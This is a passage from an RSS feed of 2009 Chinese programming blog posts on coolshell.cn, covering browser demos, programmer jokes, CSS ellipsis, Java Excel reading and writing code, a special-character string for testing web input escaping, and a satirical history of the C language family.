<p><a href="http://the389.com/works/drops/">http://the389.com/works/drops/</a>，这个示例的整个页面由Checkbox构成，你用鼠标点一下其中一个CheckBox，你会看到一个巨大的水滴滴了下去。Chrome中效果更好。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p style="text-align: left;"><span id="more-1932"></span></p>
<p><strong>一个用滚动条做的扭动效果</strong></p>
<p><a href="http://the389.com/works/shake/">http://the389.com/works/shake/</a>，页面打开你可以看到一排滚动条，用鼠标快速地横向滑动，你会看到滚动条开始跟着你的鼠标扭动。太BT了。请使用Chrome查看。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><strong>用CheckBox做的一个音阶</strong></p>
<p><a href="http://the389.com/works/tenori/">http://the389.com/works/tenori/</a>，这个效果还是只能用Chrome查看。随机地点一下其中的Checkbox，于是程序会根据你所点的顺序开始演奏一些“滴滴嘟嘟”的声音，很有意思。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><strong>用滚动条做的一个波浪效果</strong></p>
<p><a href="http://the389.com/works/scrollbars/">http://the389.com/works/scrollbars/</a>，还是用鼠标触发，把鼠标放在这一排滚动条中上下移动，你会发现滚动条会跟着你的鼠标形成波浪的效果。还是只能在Chrome中查看。</p>
<p style="text-align: center;"><a href="http://toki-woki.net/p/scroll-clock/"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">the389.com这个网站成了这些乱七八糟的小玩意的试验地，上面还有其它一些这些类似的小玩意。呵呵，不要迷恋哥，哥只是玩程序。</p>
<p style="text-align: left;">另外，在Chrome的试验田，你还可以看到很多这样的东西，甚至更弦的东西。只不过，Chrome试验田的那些小玩意看着不够“土”，所以效果不够好。呵呵。<br>
<a href="https://www.chromeexperiments.com/">http://www.chromeexperiments.com/</a></p>
<p style="text-align: left;">(全文完)</p>
<p></p>
 ]]></content>
<pubDate>2009-12-14T08:35:31+08:00</pubDate>
<guid>https://coolshell.cn/articles/1932.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员的相关笑话（二） ]]></title>
<link>https://coolshell.cn/articles/1941.html</link>
<content><![CDATA[ 
<p>前面发表过《<a title="程序员的相关笑话（一）" href="https://coolshell.cn/?p=1903">程序员的相关笑话（一）</a>》现在继续一些相关的笑话。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%89%A7%E7%BE%8A%E4%BA%BA%E4%B8%8EIT%E9%A1%BE%E9%97%AE" title="牧羊人与IT顾问">牧羊人与IT顾问</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9D%A1%E8%A7%89" title="程序员睡觉">程序员睡觉</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%87%BA%E9%94%99%E4%BF%A1%E6%81%AF" title="一个程序出错信息">一个程序出错信息</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%A8%8B%E5%BA%8F%E5%91%98%E5%96%9C%E6%AC%A2UNIX" title="为什么程序员喜欢UNIX">为什么程序员喜欢UNIX</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Google%E9%80%92%E5%BD%92%E5%85%B3%E9%94%AE%E5%AD%97" title="Google递归关键字">Google递归关键字</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B9%BD%E9%BB%98" title="一句话幽默">一句话幽默</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%89%A7%E7%BE%8A%E4%BA%BA%E4%B8%8EIT%E9%A1%BE%E9%97%AE"></span>牧羊人与IT顾问<span class="ez-toc-section-end"></span>
</h4>
<p>从前，有一个牧羊人，他有很多的羊。一天他赶着他的那群羊到了一条公路边上。突然，有一辆保时洁急驶过来，上面坐着一个年轻人人，穿着Armani的衣服，和Cerutti的皮鞋，Ray-Ban的太阳眼镜，TAG-Heuer的手表，以前Versace的领带。</p>
<p>他走到牧羊人面前问牧羊人：“如果我能说出你有多少只羊，你能给我一只吗？”</p>
<p>牧羊人看了看他那一大群数都数不过来的羊，说：“可以！”。</p>
<p>那个年轻人，于是打开了他的笔记本电脑，接上手机，进入了NASA Webster，通过GPS定位，开始扫描。然后打了40多页充满各位对数微积分的公式的Excel表格，最后通过他的那个高科技迷你打印机打出了150多页的分析报告，然后，他看了看报告，走到牧羊人前说：“你一共有1586只羊！”</p>
<p>牧羊人拍手道：“牛啊，你说的一点也没错，你挑一只吧”。</p>
<p>于是，那个年轻人挑了一只，并准备从他的保时捷中拿出一些文档给牧羊人，这时，牧羊人说：“如果我能猜出你是干什么的，我能不能要回我的那只羊？”</p>
<p>年轻人说：“为什么不呢？”</p>
<p>牧羊人说：“你是一个IT咨询顾问”</p>
<p>年轻人说：“你是怎么知道的？”</p>
<p>牧羊人说：“很简单。首先，我并没有叫你，你就来了。然后，你开始用一些我已经知道的东西向我收费。第三，你根本就不了解我的业务……，所以，现在请你把我的牧羊狗还给我。”</p>
<p><span id="more-1941"></span></p>
<h4>
<span class="ez-toc-section" id="%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9D%A1%E8%A7%89"></span>程序员睡觉<span class="ez-toc-section-end"></span>
</h4>
<p>一个标准的程序员在睡觉时候都会准备两个杯子，一个是空的，一个装满了水。装满水的杯子为的是可能自己的睡觉的过程中会口渴，空白杯子只是为了在睡觉的时候不口渴。</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%E5%87%BA%E9%94%99%E4%BF%A1%E6%81%AF"></span>一个程序出错信息<span class="ez-toc-section-end"></span>
</h4>
<p>Keyboard not found … press F1 to continue</p>
<h4>
<span class="ez-toc-section" id="%E4%B8%BA%E4%BB%80%E4%B9%88%E7%A8%8B%E5%BA%8F%E5%91%98%E5%96%9C%E6%AC%A2UNIX"></span>为什么程序员喜欢UNIX<span class="ez-toc-section-end"></span>
</h4>
<p>unzip, strip, touch, finger, grep, mount, fsck, more, yes, fsck, fsck, fsck, umount, sleep</p>
<p>（<strong>说明</strong>：unzip：拉开拉链；strip：脱掉衣服；touch：抚摸；finger：手指；grep：摸索；mount：骑上去；fsck：fxxk；more：更多；yes：爽；umount：下来；sleep：睡觉）</p>
<h4>
<span class="ez-toc-section" id="Google%E9%80%92%E5%BD%92%E5%85%B3%E9%94%AE%E5%AD%97"></span>Google递归关键字<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.google.com/search?hl=en&amp;q=recursion" target="_blank">http://www.google.com/search?hl=en&amp;q=recursion</a></p>
<h4>
<span class="ez-toc-section" id="%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B9%BD%E9%BB%98"></span>一句话幽默<span class="ez-toc-section-end"></span>
</h4>
<p>C++是一个很好的编译语言，因为你的parent（父母）不能访问你的private（隐私），但是你的friend（朋友）可以。</p>
<p>这个世界上，最佳的UI设计是“乳头”，除此之外，所有的UI都需要学习。</p>
<p>我真的想让这个世界变得更好，但是他们不给我源代码。（RE：这个世界的源代码是COBOL或汇编）</p>
<p>程序员是一种可以把香烟和咖啡变成代码的机器。</p>
<p>有多少微软的工程师会换电灯泡？没有，他们会把黑暗变成一种标准，然后对你说，这就是设计行为。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-12-14T12:10:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/1941.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Web中的省略号 ]]></title>
<link>https://coolshell.cn/articles/1949.html</link>
<content><![CDATA[ 
<p>在Web开发中，对于一种情况很常见。那就是，文本太长，而放置文本的容器不够长，而我们又不想让文本换行，所以，我们想使用省略号来解决这个问题。但是，在今天HTML的标准中并没有相关的标识或属性让你可以简单地完成这个事。但是我们可以使用CSS样式表来完成这个事，在IE，Safari，Chrome，Opera中都可以。但在Firefox中却不行，但我们可以使用jQuery来解决Firefox不兼容的问题。下面是相关的代码示例。</p>
<p><strong>使用CSS设置省略号</strong></p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">overflow: hidden;
text-overflow: ellipsis;
-o-text-overflow: ellipsis;
white-space: nowrap;
width: 100%;
</pre>
<p><span id="more-1949"></span></p>
<ul>
<li>
<strong>overflow</strong> 属性是必需的，并且属性要是hidden。</li>
<li>
<strong>white-space: nowrap</strong> 也是必需的。如果文本可以自动换行，就算是不可见，也不会有省略号的。因为文本换行了，所以没有超过容器的尺寸，所以也就不会有省略号了。</li>
<li> <strong>width </strong>属性仅在需要支持IE6时设置。 设置成100%仅是为了解决IE6的不兼容问题。（关于IE中的那些不兼容问题，你可以参看本站的《<a rel="bookmark" href="https://coolshell.cn/articles/1817.html">9个最常见IE的Bug及其fix</a>》）</li>
<li>
<strong>text-overflow: ellipsis</strong> 就是设置省略号了。目前还不是HTML的标准规范。其是由IE引入的，可以在IE6+，Safari 3.2+和Chrome上工作。</li>
<li>
<strong>-o-text-overflow: ellipsis</strong> 是 Opera 支持的。可以在 Opera 9.0+使用。</li>
</ul>
<p><strong>使用jQuery设置省略号</strong></p>
<p>正如前面所说过的，Firefox并不支持CSS中的那些省略号设置，因为那并不是标准的HTML规范。所以，我们需要使用jQuery的Javascript来干这个事。你可以下载由Devon Govett写的<a href="https://devongovett.wordpress.com/2009/04/06/text-overflow-ellipsis-for-firefox-via-jquery/">jQuery 省略号插件</a>，于是，你可以简单的把”ellipsis”赋给某些元件或是CSS定义，如下所示：</p>
<p>[javascript]$(document).ready(function() {<br>
    $(‘.ellipsis’).ellipsis();<br>
}[/javascript]</p>
<p>或是</p>
<p>[javascript]$("span").ellipsis();[/javascript]</p>
 ]]></content>
<pubDate>2009-12-15T08:43:59+08:00</pubDate>
<guid>https://coolshell.cn/articles/1949.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Java读写Excel ]]></title>
<link>https://coolshell.cn/articles/1954.html</link>
<content><![CDATA[ 
<p>本文主要向你演示如何使用JavaExcel API来读写Excel文件。关于JavaExcel API，这是一个开源的lib库。其相关的feature如下：</p>
<li>支持Excel 95, 97, 2000, <span style="color: #ff0000;">XP, 2003</span> 的制表页。</li>
<li>可以读写相关的Excel公式 （仅支持Excel 97 及以后版本）</li>
<li>可以生成 Excel 2000 格式的xls文件。</li>
<li>支持字体，数字和日期格式。</li>
<li>支持单元格的阴影，边框和颜色。</li>
<li>可以修改已存在的制表页。</li>
<li>国际化多语言集。(公式目前支持，英文，法文，西班牙文和德文）</li>
<li>支持图表拷贝。</li>
<li><span style="color: #ff0000;">支持图片的插入和复制。</span></li>
<li>日志生成可以使用Jakarta Commons Logging, log4j, JDK 1.4 Logger, 等。</li>
<li>更多……</li>
<p>你可以在这里下载：<a href="http://jexcelapi.sourceforge.net/">http://jexcelapi.sourceforge.net/</a>，然后，把jxl.jar加到你的Java的classpath中。</p>
<p>下面是两段例程，一段是如何创建Excel，一段是如何读取Excel。</p>
<p><span id="more-1954"></span></p>
<p><strong>创建Excel</strong></p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">package writer;

import java.io.File;
import java.io.IOException;
import java.util.Locale;

import jxl.CellView;
import jxl.Workbook;
import jxl.WorkbookSettings;
import jxl.format.UnderlineStyle;
import jxl.write.Formula;
import jxl.write.Label;
import jxl.write.Number;
import jxl.write.WritableCellFormat;
import jxl.write.WritableFont;
import jxl.write.WritableSheet;
import jxl.write.WritableWorkbook;
import jxl.write.WriteException;
import jxl.write.biff.RowsExceededException;


public class WriteExcel {

	private WritableCellFormat timesBoldUnderline;
	private WritableCellFormat times;
	private String inputFile;
	
public void setOutputFile(String inputFile) {
	this.inputFile = inputFile;
	}

	public void write() throws IOException, WriteException {
		File file = new File(inputFile);
		WorkbookSettings wbSettings = new WorkbookSettings();

		wbSettings.setLocale(new Locale("en", "EN"));

		WritableWorkbook workbook = Workbook.createWorkbook(file, wbSettings);
		workbook.createSheet("Report", 0);
		WritableSheet excelSheet = workbook.getSheet(0);
		createLabel(excelSheet);
		createContent(excelSheet);

		workbook.write();
		workbook.close();
	}

	private void createLabel(WritableSheet sheet)
			throws WriteException {
		// Lets create a times font
		WritableFont times10pt = new WritableFont(WritableFont.TIMES, 10);
		// Define the cell format
		times = new WritableCellFormat(times10pt);
		// Lets automatically wrap the cells
		times.setWrap(true);

		// Create create a bold font with unterlines
		WritableFont times10ptBoldUnderline = new WritableFont(
				WritableFont.TIMES, 10, WritableFont.BOLD, false,
				UnderlineStyle.SINGLE);
		timesBoldUnderline = new WritableCellFormat(times10ptBoldUnderline);
		// Lets automatically wrap the cells
		timesBoldUnderline.setWrap(true);

		CellView cv = new CellView();
		cv.setFormat(times);
		cv.setFormat(timesBoldUnderline);
		cv.setAutosize(true);

		// Write a few headers
		addCaption(sheet, 0, 0, "Header 1");
		addCaption(sheet, 1, 0, "This is another header");
		

	}

	private void createContent(WritableSheet sheet) throws WriteException,
			RowsExceededException {
		// Write a few number
		for (int i = 1; i &lt; 10; i++) {
			// First column
			addNumber(sheet, 0, i, i + 10);
			// Second column
			addNumber(sheet, 1, i, i * i);
		}
		// Lets calculate the sum of it
		StringBuffer buf = new StringBuffer();
		buf.append("SUM(A2:A10)");
		Formula f = new Formula(0, 10, buf.toString());
		sheet.addCell(f);
		buf = new StringBuffer();
		buf.append("SUM(B2:B10)");
		f = new Formula(1, 10, buf.toString());
		sheet.addCell(f);

		// Now a bit of text
		for (int i = 12; i &lt; 20; i++) {
			// First column
			addLabel(sheet, 0, i, "Boring text " + i);
			// Second column
			addLabel(sheet, 1, i, "Another text");
		}
	}

	private void addCaption(WritableSheet sheet, int column, int row, String s)
			throws RowsExceededException, WriteException {
		Label label;
		label = new Label(column, row, s, timesBoldUnderline);
		sheet.addCell(label);
	}

	private void addNumber(WritableSheet sheet, int column, int row,
			Integer integer) throws WriteException, RowsExceededException {
		Number number;
		number = new Number(column, row, integer, times);
		sheet.addCell(number);
	}

	private void addLabel(WritableSheet sheet, int column, int row, String s)
			throws WriteException, RowsExceededException {
		Label label;
		label = new Label(column, row, s, times);
		sheet.addCell(label);
	}

	public static void main(String[] args) throws WriteException, IOException {
		WriteExcel test = new WriteExcel();
		test.setOutputFile("c:/temp/lars.xls");
		test.write();
		System.out
				.println("Please check the result file under c:/temp/lars.xls ");
	}
}
</pre>
<p><strong>读取Excel</strong><br>
 </p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">package reader;

import java.io.File;
import java.io.IOException;

import jxl.Cell;
import jxl.CellType;
import jxl.Sheet;
import jxl.Workbook;
import jxl.read.biff.BiffException;

public class ReadExcel {

	private String inputFile;

	public void setInputFile(String inputFile) {
		this.inputFile = inputFile;
	}

	public void read() throws IOException  {
		File inputWorkbook = new File(inputFile);
		Workbook w;
		try {
			w = Workbook.getWorkbook(inputWorkbook);
			// Get the first sheet
			Sheet sheet = w.getSheet(0);
			// Loop over first 10 column and lines

			for (int j = 0; j &lt; sheet.getColumns(); j++) {
				for (int i = 0; i &lt; sheet.getRows(); i++) {
					Cell cell = sheet.getCell(j, i);
					CellType type = cell.getType();
					if (cell.getType() == CellType.LABEL) {
						System.out.println("I got a label "
								+ cell.getContents());
					}

					if (cell.getType() == CellType.NUMBER) {
						System.out.println("I got a number "
								+ cell.getContents());
					}

				}
			}
		} catch (BiffException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) throws IOException {
		ReadExcel test = new ReadExcel();
		test.setInputFile("c:/temp/lars.xls");
		test.read();
	}

}
</pre>
 ]]></content>
<pubDate>2009-12-15T09:36:21+08:00</pubDate>
<guid>https://coolshell.cn/articles/1954.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Web程序的最佳测试数据 ]]></title>
<link>https://coolshell.cn/articles/1957.html</link>
<content><![CDATA[ 
<p style="text-align: left;">这里有一篇Matthias写的<a title="The art of escaping" href="https://united-coders.com/matthias-reuter/the-art-of-escaping">关于转义字符文章-“The art of escaping”</a>，这篇文章告诉你有一些比较特殊的字符需要你去认真的处理，不然，你的网站程序轻则出错，重则被人黑了。这些物殊的字符是[<code>&lt;"@%'&amp;_\?/:;,&gt;কী €</code>] ，你可以使用这个字符串到任意一个可以输入的Web程序上去做测试。</p>
<p>下面这个表格告诉你为什么这些字符很特殊。这个列表不会是完整的，而且也永远不会完整。<br>
</p>
<center>
<table border="0">
<thead>
<tr>
<th>相关领域</th>
<th>转义字符</th>
</tr>
</thead>
<tbody>
<tr>
<td><a title="W3C" href="https://www.w3.org/">HTML</a></td>
<td>&lt; , &gt; , &amp;</td>
</tr>
<tr>
<td><a title="JSON-Resource" href="https://json.org/">JSON</a></td>
<td>“</td>
</tr>
<tr>
<td>
<a title="mysql character" href="https://dev.mysql.com/doc/refman/5.0/en/string-syntax.html">SQL</a> in mySql</td>
<td>字符串 “, ‘, 通配符 %, _</td>
</tr>
<tr>
<td>
<a title="rfc 1738 for urls" href="http://www.faqs.org/rfcs/rfc1738.html">rfc 1738</a> for URL-parameter</td>
<td>;, /, ?, :, “, @, =, &amp; 空格</td>
</tr>
</tbody>
</table>
<p></p>
</center>
<br>
把这些转义字符放在一起，然后再整些 utf-8 的一些特殊字符。这些utf-8的字符你可以参看本站的<a rel="bookmark" href="https://coolshell.cn/articles/1331.html">Unicode字符预览表</a>一文，并从中获取。另外，你还可以使用下面的这些工具来对你的程序进行调试或检查：
<ul>
<li>一个高级Web调试插件： <a title="firebug plugin" href="https://addons.mozilla.org/de/firefox/addon/1843">firebug</a>
</li>
<li>标准的请求/响应插件： <a href="https://addons.mozilla.org/de/firefox/addon/3829">Live HTTP headers</a>
</li>
<li>一些抓包程序： <a href="https://addons.mozilla.org/en-US/firefox/addon/6647">HTTPfox</a> or <a href="https://addons.mozilla.org/en-US/firefox/addon/966">tamper data</a>
</li>
<li>IE的开发者可以试试这个：<a href="https://www.fiddler2.com/fiddler2/">Fiddler.com</a>
</li>
</ul>
<p>如果上面的工具都不能帮助你的话，你可能需要打调试日志，或是使用一个透明的代理服务器：如： <a href="http://www.charlesproxy.com/">Charles Web Debugging Proxy</a> （Windows）</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2009-12-15T15:50:35+08:00</pubDate>
<guid>https://coolshell.cn/articles/1957.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 纯CSS做的3D效果 ]]></title>
<link>https://coolshell.cn/articles/1962.html</link>
<content><![CDATA[ 
<p>下面是一个用CSS做的一个3D的效果。你可以使用鼠标在图片中移动来显示这个效果。其实，这个效果只是能过移动图片来产生的。其可以工作在Internet Explorer 8, Firefox 3, Opera 9, Safari 3, Chrome 4 和 Konqueror 3.5下。网页在这里：<a href="http://www.romancortes.com/ficheros/meninas.html" target="_blank">http://www.romancortes.com/ficheros/meninas.html</a></p>
<p></p>
<p align="center"><iframe src="https://www.romancortes.com/ficheros/meninas.html" frameborder="0" width="400" height="455" scrolling="no"></iframe></p>
<br>

 ]]></content>
<pubDate>2009-12-16T14:04:32+08:00</pubDate>
<guid>https://coolshell.cn/articles/1962.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Java异常另类手册 ]]></title>
<link>https://coolshell.cn/articles/1970.html</link>
<content><![CDATA[ 
<p>在这个页面上<a href="http://rymden.nu/exceptions.html">http://rymden.nu/exceptions.html</a>，你会看到Java的各种异常，不过，你看看各个异常的解释，你会发现非常有趣，下面例举几个吧：</p>
<p><strong>java.lang.ArithmeticException</strong></p>
<p>你正在使用计算解决一个你不能自己解释的数学问题，请你重新读一下你的程序，然后，再试一次。</p>
<p><strong>java.lang.ClassNotFoundException</strong></p>
<p>你应该是发明创造了一个你自己的类，目前，Java中还没有实现“<a href="https://zh.wikipedia.org/wiki/%E5%8D%B0%E5%BA%A6%E7%A7%8D%E5%A7%93%E5%88%B6%E5%BA%A6" target="_blank">种姓制度</a>”，但是Java明显使用了巴厘岛的种姓制度。也就是说，如果你是一个武士（wesia），也就相当于印度种姓制度中的第三层——吠舍（vaishya）</p>
<p><strong>java.lang.IllegalAccessException</strong></p>
<p>你是一个正在运行Java程序入室盗窃的小偷，请停止对电脑的盗窃行为，离开房子，然后再试一次。</p>
<p><span id="more-1970"></span></p>
<p><strong>java.lang.NullPointerException</strong></p>
<p>你没有狗。请你先找一只狗（比如：布烈塔尼獵犬），然后再试一次。</p>
<p><strong>java.lang.SecurityException</strong></p>
<p>你已被认为是国家安全的一个威胁。请你呆在原地别动，然后等着警察来并带你走。</p>
<p><strong>java.awt.AWTException</strong></p>
<p>你正在使用AWT，也就是说你的图形界面会很丑。这个异常只是一个警告可以被忽略。</p>
<p><strong>java.beans.IntrospectionException</strong></p>
<p>你太内向了，你应该变得外向一些。 请你不要再干这些无奈的事了，出门去见见人吧。</p>
<p><strong>java.io.EOFException</strong></p>
<p>你只所以要看手册是因为你不知道EOF是什么意思。我并不打算告诉你，因为你是一个不学无术的人。</p>
<p><strong>java.io.FileNotFoundException</strong></p>
<p>连木匠都知道他的工具放在哪里。</p>
 ]]></content>
<pubDate>2009-12-17T16:44:15+08:00</pubDate>
<guid>https://coolshell.cn/articles/1970.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一个“精湛”的JS程序 ]]></title>
<link>https://coolshell.cn/articles/1973.html</link>
<content><![CDATA[ 
<p>下面是一个很“精湛”的JS程序：</p>
<p style="text-align: center;"><a href="http://rmd.atdmt.com/tl/DocumentDotWrite.js" target="_blank">http://rmd.atdmt.com/tl/DocumentDotWrite.js</a></p>
<p>这个JS文件中“精湛”之处在于，其只有一行代码，如下所示：</p>
<blockquote><p>function <strong>DocumentDotWrite</strong>(s){document.write(s);}</p></blockquote>
<p>下面这个贴子讨论了这个JS文件：<br>
<a href="http://forums.thedailywtf.com/forums/p/7872/147330.aspx">http://forums.thedailywtf.com/forums/p/7872/147330.aspx</a></p>
<p>大家都在猜测为什么那个程序员要这么干，下面是一些猜测：</p>
<ol>
<li>网友superjer说：这是一个伟大的创造，解决了你的键盘“.”键损坏的情况。</li>
<li>网友Heron说：这是从Character Map上拷贝粘贴下来的。</li>
<li>网友mfah说：这是世界上第一个用C来包装Javascript的示例。</li>
<li>网友djork说：我是一个用手机编程的人，这个方法可以让人在手机上更容易输入我的代码。</li>
<li>网友PSWorx说：可能他们想把document.write作为一个回调函数，但直接把document.write传进去不行。</li>
<li>还有一个网友说：这么做或者可以阻止网页上的广告阻截器。</li>
</ol>
<p>呵呵，看来，“超级天才”和“极端愚蠢”可能只是一线之差，只有写这段程序的那个程序员才知道为什么要这么干了。也许，他的键盘的那个键真的是坏了也不一定。</p>
 ]]></content>
<pubDate>2009-12-18T17:20:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/1973.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 【问题】传球问题 ]]></title>
<link>https://coolshell.cn/articles/1976.html</link>
<content><![CDATA[ 
<p>有a,b,c,d,四个人<br>
互相传球<br>
从a开始传出<br>
经过5次传球后<br>
球回到a的手里</p>
<p>算总共有多少种传球的方法</p>
 ]]></content>
<pubDate>2009-12-20T17:41:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/1976.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C语言的演变史 ]]></title>
<link>https://coolshell.cn/articles/1984.html</link>
<content><![CDATA[ 
<p>1972 – C语言的先驱——B语言，被贝尔实验室开发。B语言是一个很快速的，容易维护的，而且对于从系统到应用开发是很好用的。设计这门语言的整个团队被马上解雇了，因为他们干了一件和电话通讯不相干的事情。最后这个项目转给了 Dennis Ritchie。他把这个语言变得不容易理解，很难维护，而且，只能用于系统方面的编程。而且，他还设计了一个指针系统，保让每一个程序都超过500行，并可以使用操作系统的指针。</p>
<p>1982 – 大家发现有97% 的C程序调用产生了“缓冲区溢出”问题。于是，C 程序员们开始意识到，就算是不必要也必需要初始化变量。然而，强制性的变量初始化这个明智的决定，很难影响了当时已经写成了的97%的C程序，所以结果什么也没有发生。 </p>
<p>1984 – 操作系统出现了“错误指针”的问题数量开始戏剧性地增涨。 </p>
<p>1985 – 一系列的让C语言有面向对象能力的解决方法出现了，一个叫“C With Classes”正准备商业化。然而，大家觉得名字“C With Classes”太清楚和容易被理解了，所以，最终的商业版本叫做—— C++。</p>
<p><span id="more-1984"></span></p>
<p>1986 – C语言成为最流行的语句，其被很多业界分析师推荐于业务应用。他们向全世界宣称——由C语言写成的应用将可以运行在很多不同的平台上的，是跨平台的。目前看来，这些众多的分析者在当时有可能是因为某种迷幻而导致其大脑被所蛊惑了。</p>
<p>1988 – 业界的这些分析家们因为“摇头丸”吃完了。所以，在他们的幻觉过去以后，他们注意到，使用C语言来开发业务应用会增加5倍以上的开发时间，并且程序也不具备可移植性。他们开始停止向大众推荐使用C语言来开发业务应用了，只能很少一部服用可卡因的人开始转向推荐大众使用C++语言写业务应用程序，他们说，“那是面向对象的，所以，代码是很容易重用的”。</p>
<p>1990 – 在这个时候，所有的C编译器都转到了C++编译器上。但是，因为大多数的C++程序员并没有使用C++中那些面向对象的语言特性。也就是说，在实际上来说，那种浮肿的代码结构加上操作系统指针的代码被一种叫面向对象的编译器编译。</p>
<p>1990 – 在雇佣了一些转向“吸胶毒”的分析师后，Sun决定要创造一种叫Oak的语言，这种语言主要用于电视的机顶盒。因为当时几乎所有的程序员的DNA中都有C语的基因，所以，这个语言向C和C++中大量地借鉴了很多它们的语法和编程思路。然而，机顶盒上没有操作系统，也就不存在指针，所以，他们把指针从这门语言里给去掉了。</p>
<p>1994 – Sun公司里的某个人意识到为一个机顶盒开发一个语言是多么愚蠢的事情。于是，这个语言更名为Java，并且为其注入了“Internet”的特征，从而让其成为一个真正可以被移植的语言。其市场营销上相当成功，而那时有3%的业内人士开始明白什么是Internet，同时，那些精神不正常的分析师们还在不停地嗑药并向大众鼓吹他们的神话——“跨平台移植性”。</p>
<p>1995 – Sun 向业界的分析师们提供了免费蘑菇迷魂汤，导致那些分析师在喝下汤后，马上开始写下“Java是一门未来的可移植的和Ineternet高度可集成的语言”。</p>
<p>1996 中 – 17,468,972 篇文章出现，描述了Java是怎么一门未来的语言。这也是Java Applet开始进入Web页的时代。</p>
<p>1996 末– 程序员开始使用Java applet创建他们的Web页面，然后他们开始因为挫折和沮丧开始集体自杀。此时，那些分析师开始增大蘑菇迷魂汤的剂量。</p>
<p>1997 – 因为接受了产生幻觉分析师的建议，Corel 决定重写他们的应用，包括 WordPerfect，当然，是用Java写的。最终的结果是，这是迄今为止比“打字机”还慢的字处理软件。</p>
<p>1998 –  在意识到applet已在快速枯萎，Sun又一次的重新配置了Java，这次，他们叫Severlet，这是一个服务器的程序语言。这个设计在抄袭了Microsoft Transaction Server ，并且，他们说服所有人这个设计是他们创造的。</p>
<p>1999 – 业内那些喝多了的分析师们用一种咆哮的方式向大众介绍了Java 2 Enterprise Edition 。 21,499,512 文章被写出来。但是，实际上并没有人使用，因为J2EE太不成熟，而又太贵了。</p>
<p>2000 – J2EE 最终还是运转起来了（一点点）。而且，所有的Java卖主们开始准备向其砸钱，与此同时，Microsoft 宣布了.NET，这是一个包括了所有的J2EE功能但没那么贵的产品。实际上来说， Microsoft 决定让Windows的用户免费使用.NET 。 Scott McNealy 很愤怒，其对Microsoft开展了相关的法律诉讼。</p>
<p>.NET 包括了最新的C家族语言，叫C#，发音是“C-pound”，继承最家族的传统，使用着一个愚蠢的名字。</p>
<p>2001 – Microsoft 的市场部意识到，在市面上没有人谈论他们的产品，他们找了其中一个程序员一起吃中饭，才发现，他们把C#叫做 “C sharp”。</p>
<p>2002 – C# 成为 Microsoft .NET的一部分。 C++ 的开发者在 Microsoft 平台上为 “managed code”而欢呼雀跃，也就是说，他们最终得到了一个内存自动管理的功能，这一功能正是1991年的Visual Basic 及1995年的Java所创建的 。</p>
<p><em>copyright (C) 1996-2006 by Billy S. Hollis, originally posted on dotnetmasters.com 13 January 2006</em></p>
<p> 文章：<a href="http://dotnetmasters.com/historyofcfamily.htm" target="_blank">来源</a></p>
<p><em> </em></p>
 ]]></content>
<pubDate>2009-12-21T08:12:10+08:00</pubDate>
<guid>https://coolshell.cn/articles/1984.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 程序员眼中的编程语言 ]]></title>
<link>https://coolshell.cn/articles/1992.html</link>
<content><![CDATA[ 
<p>下图是一个搞笑的图片——程序员眼中的编程语言。</p>
<ul>
<li>图片的横轴是编程语言。</li>
<li>纵轴是各语言的程序员、粉丝、信徒。</li>
<li>中间的各个小图片则是，粉丝眼中的编程语言的形象。</li>
</ul>
<p>比如说，</p>
<ul>
<li>第一行第一列，是Java程序员看Java语言的样子，一幢现代化的大厦。</li>
<li>第一行第二列，是Java程序员看C语言，一个年老过时的骨灰级老头。</li>
<li>当然，C程序员看Java语言也比较搞，见第二行第一列。呵呵。</li>
</ul>
